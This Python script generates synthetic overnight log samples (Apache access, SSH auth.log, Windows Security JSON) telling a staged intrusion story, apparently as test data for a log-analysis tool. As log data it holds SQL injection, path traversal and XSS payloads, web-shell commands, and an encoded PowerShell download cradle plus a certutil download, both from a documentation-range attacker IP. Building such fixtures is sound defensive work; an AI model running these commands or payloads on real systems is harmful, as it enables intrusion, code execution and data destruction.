"""Generate the synthetic sample logs in samples/.

Everything here is made up: IPs come from the RFC 5737 documentation ranges
(192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) and hostnames use example.com.
The logs tell one overnight story across three sources, mixed with normal traffic:

  01:00  web     203.0.113.45 scans the shop, probes for SQLi/XSS/traversal,
                 uploads a PHP web shell and runs commands through it
  02:00  ssh     198.51.100.23 sprays usernames, then guesses deploy's password,
                 logs in and sudo's to a root shell
  04:00  windows 203.0.113.80 brute-forces RDP, gets in as helpdesk, runs encoded
                 PowerShell, downloads a payload, adds a backdoor admin,
                 and clears the Security log

Run:  python scripts/make_samples.py
"""
import base64
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path
from urllib.parse import quote

OUT = Path(__file__).resolve().parent.parent / "samples"
DAY = datetime(2026, 11, 6, tzinfo=timezone.utc)
rng = random.Random(7)

BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
]
PAGES = ["/", "/products", "/products?id=12", "/products?id=31", "/cart", "/about", "/static/app.css", "/static/app.js", "/login"]


def at(h, m, s=0):
    return DAY + timedelta(hours=h, minutes=m, seconds=s)


# --------------------------------------------------------------------------- web

def web_line(ts, ip, method, path, status, size, ua, ref="-"):
    stamp = ts.strftime("%d/%b/%Y:%H:%M:%S +0000")
    return f'{ip} - - [{stamp}] "{method} {path} HTTP/1.1" {status} {size} "{ref}" "{ua}"'


def make_web():
    rows = []
    # Normal shoppers all night.
    for _ in range(260):
        ts = at(0, 30) + timedelta(seconds=rng.randint(0, 5 * 3600))
        ip = f"192.0.2.{rng.randint(20, 220)}"
        rows.append((ts, web_line(ts, ip, "GET", rng.choice(PAGES), rng.choice([200] * 9 + [304]), rng.randint(800, 40000), rng.choice(BROWSERS))))

    atk = "203.0.113.45"
    # 01:02 Nikto directory scan: lots of 404s, fast.
    nikto = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)"
    probes = ["/admin/", "/backup.zip", "/.git/config", "/.env", "/phpmyadmin/", "/wp-login.php", "/server-status", "/config.php.bak",
              "/test/", "/old/", "/db.sql", "/admin.php", "/cgi-bin/test.cgi", "/.svn/entries", "/install/", "/console",
              "/manager/html", "/web.config", "/debug", "/api/v1/users", "/shell.php", "/upload.php", "/info.php", "/.DS_Store",
              "/credentials.txt", "/logs/", "/tmp/", "/private/", "/staging/", "/dev/"]
    for i, p in enumerate(probes):
        ts = at(1, 2, i * 2)
        status = 200 if p == "/upload.php" else 404
        rows.append((ts, web_line(ts, atk, "GET", p, status, 196 if status == 404 else 1430, nikto)))

    # 01:10 SQL injection with sqlmap.
    sqlmap = "sqlmap/1.8.7#stable (https://sqlmap.org)"
    sqli = ["12' OR '1'='1", "12 UNION ALL SELECT NULL,NULL,NULL--", "12 AND SLEEP(5)", "12 UNION SELECT username,password FROM users--",
            "12' AND extractvalue(1,concat(0x7e,version()))--", "12; DROP TABLE orders--"]
    for i, q in enumerate(sqli):
        ts = at(1, 10, i * 9)
        rows.append((ts, web_line(ts, atk, "GET", "/products?id=" + quote(q), rng.choice([200, 500]), rng.randint(300, 5000), sqlmap)))

    # 01:15 path traversal, 01:18 XSS probe.
    ts = at(1, 15)
    rows.append((ts, web_line(ts, atk, "GET", "/download?file=" + quote("../../../../etc/passwd"), 400, 312, BROWSERS[0])))
    ts = at(1, 15, 20)
    rows.append((ts, web_line(ts, atk, "GET", "/download?file=..%252f..%252f..%252fwindows%252fwin.ini", 400, 312, BROWSERS[0])))
    ts = at(1, 18)
    rows.append((ts, web_line(ts, atk, "GET", "/search?q=" + quote('<script>alert(document.cookie)</script>'), 200, 2210, BROWSERS[0])))
    ts = at(1, 18, 30)
    rows.append((ts, web_line(ts, atk, "GET", "/search?q=" + quote('<svg onload=alert(1)>'), 200, 2210, BROWSERS[0])))

    # 01:31 web shell upload and use.
    ts = at(1, 31)
    rows.append((ts, web_line(ts, atk, "POST", "/upload.php", 200, 88, BROWSERS[0], "https://shop.example.com/upload.php")))
    for i, cmd in enumerate(["id", "whoami", "uname -a", "cat /etc/passwd", "ls -la /var/www"]):
        ts = at(1, 33, i * 25)
        rows.append((ts, web_line(ts, atk, "GET", "/uploads/avatar_7.php?cmd=" + quote(cmd), 200, rng.randint(40, 2000), BROWSERS[0])))

    rows.sort()
    (OUT / "access.log").write_text("\n".join(r for _, r in rows) + "\n", encoding="utf-8")


# --------------------------------------------------------------------------- auth.log

def syslog(ts, prog, msg, host="web01"):
    pid = rng.randint(1000, 40000)
    return f"{ts.strftime('%b %e %H:%M:%S')} {host} {prog}[{pid}]: {msg}"


def make_auth():
    rows = []
    # Normal admin activity.
    for h, m in [(0, 40), (3, 5), (5, 12)]:
        ts = at(h, m)
        rows.append((ts, syslog(ts, "sshd", "Accepted publickey for aadil from 192.0.2.10 port 51122 ssh2: ED25519 SHA256:k3yF1ng3rpr1nt")))
        ts2 = ts + timedelta(minutes=2)
        rows.append((ts2, syslog(ts2, "sudo", "   aadil : TTY=pts/0 ; PWD=/home/aadil ; USER=root ; COMMAND=/usr/bin/systemctl status nginx")))
    for h in range(0, 6):
        ts = at(h, 0, 1)
        rows.append((ts, syslog(ts, "CRON", "pam_unix(cron:session): session opened for user deploy(uid=1001) by (uid=0)")))

    atk = "198.51.100.23"
    # 02:00 password spray across common usernames.
    t = at(2, 0)
    for user in ["admin", "test", "oracle", "ubuntu", "postgres", "git", "jenkins", "support"]:
        rows.append((t, syslog(t, "sshd", f"Invalid user {user} from {atk} port {rng.randint(30000, 60000)}")))
        t += timedelta(seconds=3)
        rows.append((t, syslog(t, "sshd", f"Failed password for invalid user {user} from {atk} port {rng.randint(30000, 60000)} ssh2")))
        t += timedelta(seconds=rng.randint(15, 40))
    # 02:06 guessing deploy's password.
    t = at(2, 6)
    for _ in range(11):
        rows.append((t, syslog(t, "sshd", f"Failed password for deploy from {atk} port {rng.randint(30000, 60000)} ssh2")))
        t += timedelta(seconds=rng.randint(20, 45))
    t = at(2, 14, 7)
    rows.append((t, syslog(t, "sshd", f"Accepted password for deploy from {atk} port 44312 ssh2")))
    t = at(2, 16, 40)
    rows.append((t, syslog(t, "sudo", "  deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash")))

    # 03:40 someone logs in directly as root.
    t = at(3, 40, 2)
    rows.append((t, syslog(t, "sshd", "Accepted password for root from 192.0.2.77 port 50014 ssh2")))

    rows.sort()
    (OUT / "auth.log").write_text("\n".join(r for _, r in rows) + "\n", encoding="utf-8")


# --------------------------------------------------------------------------- Windows Security JSON

def win(ts, eid, data, host="WS-07.corp.example.com"):
    return {"TimeCreated": ts.isoformat().replace("+00:00", "Z"), "Id": eid, "Computer": host, "Data": data}


def make_windows():
    rows = []
    for h, m, user in [(0, 15, "jlee"), (1, 2, "mpatel"), (3, 30, "jlee"), (5, 45, "mpatel")]:
        rows.append(win(at(h, m), 4624, {"TargetUserName": user, "IpAddress": "192.0.2.31", "LogonType": "3"}))

    atk = "203.0.113.80"
    t = at(4, 1)
    for user in ["Administrator", "admin", "helpdesk", "Administrator", "helpdesk", "backup", "helpdesk", "scanner", "helpdesk", "helpdesk", "user1", "helpdesk"]:
        rows.append(win(t, 4625, {"TargetUserName": user, "IpAddress": atk, "LogonType": "10"}))
        t += timedelta(seconds=rng.randint(6, 14))
    rows.append(win(at(4, 5, 2), 4624, {"TargetUserName": "helpdesk", "IpAddress": atk, "LogonType": "10"}))

    script = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.80/a.ps1')"
    enc = base64.b64encode(script.encode("utf-16-le")).decode()
    rows.append(win(at(4, 9), 4688, {"SubjectUserName": "helpdesk", "NewProcessName": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                                     "CommandLine": f"powershell.exe -NoP -W Hidden -enc {enc}"}))
    rows.append(win(at(4, 10, 30), 4688, {"SubjectUserName": "helpdesk", "NewProcessName": r"C:\Windows\System32\certutil.exe",
                                          "CommandLine": r"certutil.exe -urlcache -split -f http://203.0.113.80/p.exe C:\Users\Public\p.exe"}))
    rows.append(win(at(4, 12), 4720, {"SubjectUserName": "helpdesk", "TargetUserName": "svc-backup"}))
    rows.append(win(at(4, 12, 20), 4732, {"SubjectUserName": "helpdesk", "TargetUserName": "Administrators", "MemberName": "svc-backup"}))
    rows.append(win(at(4, 20), 1102, {"SubjectUserName": "helpdesk"}))

    rows.sort(key=lambda r: r["TimeCreated"])
    (OUT / "security.json").write_text(json.dumps(rows, indent=1) + "\n", encoding="utf-8")


if __name__ == "__main__":
    OUT.mkdir(exist_ok=True)
    make_web()
    make_auth()
    make_windows()
    print(f"Wrote samples to {OUT}")
